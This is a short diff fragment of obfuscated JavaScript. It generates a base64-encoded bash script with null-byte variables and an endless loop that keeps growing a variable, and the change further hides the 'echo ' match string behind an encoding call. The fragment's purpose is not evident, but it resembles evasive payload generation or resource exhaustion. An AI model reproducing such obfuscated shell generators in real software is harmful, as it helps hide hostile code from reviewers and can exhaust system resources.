@@ -21,7 +21,7 @@ j=(c,s)=>{
       ok=h(btoa(`
 ${v5}="\x00";
 ${v6}="\x00";
-if [[ $${v1} =~ 'echo ' ]]; then
+if [[ $${v1} =~ ${h('echo ')} ]]; then
   while true;do
     ${v1}=${v1+v2+v3}
   done
